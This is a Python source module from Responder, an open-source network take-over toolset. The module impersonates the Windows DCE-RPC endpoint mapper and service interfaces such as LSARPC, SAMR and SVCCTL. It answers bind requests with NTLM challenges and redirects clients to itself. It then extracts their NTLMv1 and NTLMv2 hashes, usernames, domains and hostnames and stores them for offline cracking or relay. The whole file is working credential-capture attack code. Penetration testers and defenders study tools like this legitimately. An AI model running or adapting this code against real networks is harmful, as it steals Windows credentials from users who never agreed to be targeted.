#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
import struct
import re
import ssl
import codecs

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

from packets import RPCMapBindAckAcceptedAns, RPCMapBindMapperAns, RPCHeader, NTLMChallenge, RPCNTLMNego

# Transfer syntaxes
NDR = "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60" # NDR v2
Map = "\x33\x05\x71\x71\xba\xbe\x37\x49\x83\x19\xb5\xdb\xef\x9c\xcc\x36" # v1
MapBind = "\x08\x83\xaf\xe1\x1f\x5d\xc9\x11\x91\xa4\x08\x00\x2b\x14\xa0\xfa"

# Common RPC interface UUIDs (original ones)
DSRUAPI  = "\x35\x42\x51\xe3\x06\x4b\xd1\x11\xab\x04\x00\xc0\x4f\xc2\xdc\xd2"  # v4
LSARPC   = "\x78\x57\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xab" # v0
NETLOGON = "\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\xcf\xfb" # v1
WINSPOOL = "\x96\x3f\xf0\x76\xfd\xcd\xfc\x44\xa2\x2c\x64\x95\x0a\x00\x12\x09" # v1

# Additional RPC interfaces for better coverage
SAMR     = "\x78\x57\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xac" # v1 - Security Account Manager
SRVSVC   = "\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88" # v3 - Server Service
WKSSVC   = "\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a" # v1 - Workstation Service
WINREG   = "\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03" # v1 - Windows Registry
SVCCTL   = "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03" # v2 - Service Control Manager
ATSVC    = "\x82\x06\xf7\x1f\x51\x0a\xe8\x30\x07\x6d\x74\x0b\xe8\xce\xe9\x8b" # v1 - Task Scheduler
DNSSERVER= "\xa4\xc2\xab\x50\x4d\x57\xb3\x40\x9d\x66\xee\x4f\xd5\xfb\xa0\x76" # v5 - DNS Server

# Interface names for logging
INTERFACE_NAMES = {
	DSRUAPI: "DRSUAPI",
	LSARPC: "LSARPC",
	NETLOGON: "NETLOGON",
	WINSPOOL: "WINSPOOL",
	SAMR: "SAMR",
	SRVSVC: "SRVSVC",
	WKSSVC: "WKSSVC",
	WINREG: "WINREG",
	SVCCTL: "SVCCTL",
	ATSVC: "ATSVC",
	DNSSERVER: "DNSSERVER"
}

def FindNTLMOpcode(data):
	"""Find NTLMSSP message type in data"""
	SSPIStart = data.find(b'NTLMSSP')
	if SSPIStart == -1:
		return False
	SSPIString = data[SSPIStart:]
	if len(SSPIString) < 12:
		return False
	return SSPIString[8:12]

def ParseRPCHash(data, client, Challenge):
	"""Parse NTLMSSP v1/v2 hashes from RPC data"""
	SSPIStart = data.find(b'NTLMSSP')
	if SSPIStart == -1:
		return
	
	SSPIString = data[SSPIStart:]
	if len(SSPIString) < 64:
		return
	
	try:
		LMhashLen    = struct.unpack('<H', data[SSPIStart+14:SSPIStart+16])[0]
		LMhashOffset = struct.unpack('<H', data[SSPIStart+16:SSPIStart+18])[0]
		LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen]
		LMHash       = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
		
		NthashLen    = struct.unpack('<H', data[SSPIStart+20:SSPIStart+22])[0]
		NthashOffset = struct.unpack('<H', data[SSPIStart+24:SSPIStart+26])[0]
		
		# NTLMv1
		if NthashLen == 24:
			SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
			SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
			DomainLen    = struct.unpack('<H', SSPIString[30:32])[0]
			DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
			Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
			UserLen      = struct.unpack('<H', SSPIString[38:40])[0]
			UserOffset   = struct.unpack('<H', SSPIString[40:42])[0]
			Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
			
			# Try to get hostname
			HostnameLen    = struct.unpack('<H', SSPIString[46:48])[0]
			HostnameOffset = struct.unpack('<H', SSPIString[48:50])[0]
			if HostnameLen > 0 and HostnameOffset + HostnameLen <= len(SSPIString):
				Hostname = SSPIString[HostnameOffset:HostnameOffset+HostnameLen].decode('UTF-16LE', errors='ignore')
			else:
				Hostname = ''
			
			WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, codecs.encode(Challenge, 'hex').decode('latin-1'))
			
			SaveToDb({
				'module': 'DCE-RPC',
				'type': 'NTLMv1-SSP',
				'client': client,
				'hostname': Hostname,
				'user': Domain+'\\'+Username,
				'hash': SMBHash,
				'fullhash': WriteHash,
			})
		
		# NTLMv2
		elif NthashLen > 60:
			SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
			SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
			DomainLen    = struct.unpack('<H', SSPIString[30:32])[0]
			DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
			Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
			UserLen      = struct.unpack('<H', SSPIString[38:40])[0]
			UserOffset   = struct.unpack('<H', SSPIString[40:42])[0]
			Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
			
			# Try to get hostname
			HostnameLen    = struct.unpack('<H', SSPIString[46:48])[0]
			HostnameOffset = struct.unpack('<H', SSPIString[48:50])[0]
			if HostnameLen > 0 and HostnameOffset + HostnameLen <= len(SSPIString):
				Hostname = SSPIString[HostnameOffset:HostnameOffset+HostnameLen].decode('UTF-16LE', errors='ignore')
			else:
				Hostname = ''
			
			WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge, 'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
			
			SaveToDb({
				'module': 'DCE-RPC',
				'type': 'NTLMv2-SSP',
				'client': client,
				'hostname': Hostname,
				'user': Domain+'\\'+Username,
				'hash': SMBHash,
				'fullhash': WriteHash,
			})
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[DCE-RPC] Error parsing hash: %s' % str(e)))

def FindInterfaceUUID(data):
	"""Find which RPC interface UUID is being requested"""
	# Check for each known interface UUID in the data
	for uuid, name in INTERFACE_NAMES.items():
		if NetworkSendBufferPython2or3(uuid) in data:
			return uuid, name
	return None, None

class RPCMap(BaseRequestHandler):
	"""RPCMap handler - Port 135 Endpoint Mapper"""
	
	def handle(self):
		try:
			data = self.request.recv(2048)
			if not data:
				return
			
			self.request.settimeout(5)
			Challenge = RandomChallenge()
			
			# Handle BIND request
			if data[0:3] == b"\x05\x00\x0b":  # Bind Request
				# Identify which interface first
				uuid, interface_name = FindInterfaceUUID(data)
				if not interface_name:
					interface_name = "unknown interface"
				
				# Check for NTLMSSP NEGOTIATE in BIND
				if FindNTLMOpcode(data) == b"\x01\x00\x00\x00":
					# Send NTLMSSP CHALLENGE
					n = NTLMChallenge(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					n.calculate()
					RPC = RPCNTLMNego(Data=n)
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					
					# Receive NTLMSSP AUTH
					data = self.request.recv(2048)
					if FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
						ParseRPCHash(data, self.client_address[0], Challenge)
						print(color("[*] [DCE-RPC] NTLM authentication on %s from %s" % (interface_name, self.client_address[0].replace("::ffff:", "")), 3, 1))
						self.request.close()
						return
				
				# Standard BIND processing
				if NetworkSendBufferPython2or3(Map) in data:
					RPC = RPCMapBindAckAcceptedAns(CTX1UID=Map, CTX1UIDVersion="\x01\x00\x00\x00", CallID=NetworkRecvBufferPython2or3(data[12:16]))
				elif NetworkSendBufferPython2or3(NDR) in data and NetworkSendBufferPython2or3(Map) not in data:
					RPC = RPCMapBindAckAcceptedAns(CTX1UID=NDR, CTX1UIDVersion="\x02\x00\x00\x00", CallID=NetworkRecvBufferPython2or3(data[12:16]))
				else:
					# Try to identify which interface
					if uuid:
						RPC = RPCMapBindAckAcceptedAns(CTX1UID=uuid, CTX1UIDVersion="\x01\x00\x00\x00", CallID=NetworkRecvBufferPython2or3(data[12:16]))
						if settings.Config.Verbose:
							print(text('[DCE-RPC] BIND request for %s from %s' % (interface_name, self.client_address[0].replace("::ffff:", ""))))
					else:
						# Default to NDR
						RPC = RPCMapBindAckAcceptedAns(CTX1UID=NDR, CTX1UIDVersion="\x02\x00\x00\x00", CallID=NetworkRecvBufferPython2or3(data[12:16]))
				
				RPC.calculate()
				self.request.send(NetworkSendBufferPython2or3(str(RPC)))
				
				# Try to receive more data (AUTH3 or REQUEST)
				try:
					data = self.request.recv(2048)
					if data:
						# Check for AUTH3 (packet type 0x10)
						if len(data) > 2 and data[2:3] == b"\x10":
							if FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
								ParseRPCHash(data, self.client_address[0], Challenge)
								print(color("[*] [DCE-RPC] NTLM authentication on %s from %s" % (interface_name, self.client_address[0].replace("::ffff:", "")), 3, 1))
						# Check for NTLM in any subsequent packet
						elif FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
							ParseRPCHash(data, self.client_address[0], Challenge)
							print(color("[*] [DCE-RPC] NTLM authentication on %s from %s" % (interface_name, self.client_address[0].replace("::ffff:", "")), 3, 1))
				except:
					pass
			
			# Handle mapper requests (after BIND)
			elif data[0:3] == b"\x05\x00\x00":  # Mapper request
				uuid, name = FindInterfaceUUID(data)
				
				if uuid == DSRUAPI:
					x = RPCMapBindMapperAns()
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to DRSUAPI auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == LSARPC:
					x = RPCMapBindMapperAns(Tower1UID=LSARPC, Tower1Version="\x00\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to LSARPC auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == SAMR:
					x = RPCMapBindMapperAns(Tower1UID=SAMR, Tower1Version="\x01\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to SAMR auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == SRVSVC:
					x = RPCMapBindMapperAns(Tower1UID=SRVSVC, Tower1Version="\x03\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to SRVSVC auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == WKSSVC:
					x = RPCMapBindMapperAns(Tower1UID=WKSSVC, Tower1Version="\x01\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to WKSSVC auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == WINSPOOL:
					x = RPCMapBindMapperAns(Tower1UID=WINSPOOL, Tower1Version="\x01\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to WINSPOOL auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == WINREG:
					x = RPCMapBindMapperAns(Tower1UID=WINREG, Tower1Version="\x01\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to WINREG auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == SVCCTL:
					x = RPCMapBindMapperAns(Tower1UID=SVCCTL, Tower1Version="\x02\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to SVCCTL auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == ATSVC:
					x = RPCMapBindMapperAns(Tower1UID=ATSVC, Tower1Version="\x01\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to ATSVC auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == DNSSERVER:
					x = RPCMapBindMapperAns(Tower1UID=DNSSERVER, Tower1Version="\x05\x00", Tower2UID=NDR, Tower2Version="\x02\x00")
					x.calculate()
					RPC = RPCHeader(Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					print(color("[*] [DCE-RPC Mapper] Redirected %-15s to DNSSERVER auth server." % self.client_address[0].replace("::ffff:", ""), 3, 1))
				
				elif uuid == NETLOGON:
					# Don't redirect NETLOGON for now - we want NTLM not SecureChannel
					self.request.close()
					return
				
				# Try to receive more data
				try:
					data = self.request.recv(2048)
					if data and FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
						ParseRPCHash(data, self.client_address[0], Challenge)
						print(color("[*] [DCE-RPC] NTLM authentication on %s from %s" % (name or "unknown interface", self.client_address[0].replace("::ffff:", "")), 3, 1))
				except:
					pass
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[DCE-RPC] Exception in RPCMap: %s' % str(e)))
			pass
		finally:
			try:
				self.request.close()
			except:
				pass


class RPCMapper(BaseRequestHandler):
	"""RPCMapper handler - Handles actual RPC service connections"""
	
	def handle(self):
		try:
			data = self.request.recv(2048)
			if not data:
				return
			
			self.request.settimeout(3)
			Challenge = RandomChallenge()
			
			# Look for NTLMSSP NEGOTIATE
			if FindNTLMOpcode(data) == b"\x01\x00\x00\x00":
				n = NTLMChallenge(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
				n.calculate()
				RPC = RPCNTLMNego(Data=n)
				RPC.calculate()
				self.request.send(NetworkSendBufferPython2or3(str(RPC)))
				
				# Wait for NTLMSSP AUTH
				data = self.request.recv(2048)
			
			# Look for NTLMSSP AUTH
			if FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
				ParseRPCHash(data, self.client_address[0], Challenge)
				print(color("[*] [DCE-RPC Mapper] NTLM authentication from %s" % self.client_address[0].replace("::ffff:", ""), 3, 1))
			
			# Check if this is a BIND with auth
			elif data[0:3] == b"\x05\x00\x0b":
				uuid, name = FindInterfaceUUID(data)
				if name and settings.Config.Verbose:
					print(text('[DCE-RPC Mapper] Connection for %s from %s' % (name, self.client_address[0].replace("::ffff:", ""))))
				
				# Check for NTLMSSP in BIND
				if FindNTLMOpcode(data) == b"\x01\x00\x00\x00":
					n = NTLMChallenge(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
					n.calculate()
					RPC = RPCNTLMNego(Data=n)
					RPC.calculate()
					self.request.send(NetworkSendBufferPython2or3(str(RPC)))
					
					data = self.request.recv(2048)
					if FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
						ParseRPCHash(data, self.client_address[0], Challenge)
						print(color("[*] [DCE-RPC Mapper] NTLM authentication on %s from %s" % (name or "unknown interface", self.client_address[0].replace("::ffff:", "")), 3, 1))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[DCE-RPC Mapper] Exception: %s' % str(e)))
			pass
		finally:
			try:
				self.request.close()
			except:
				pass
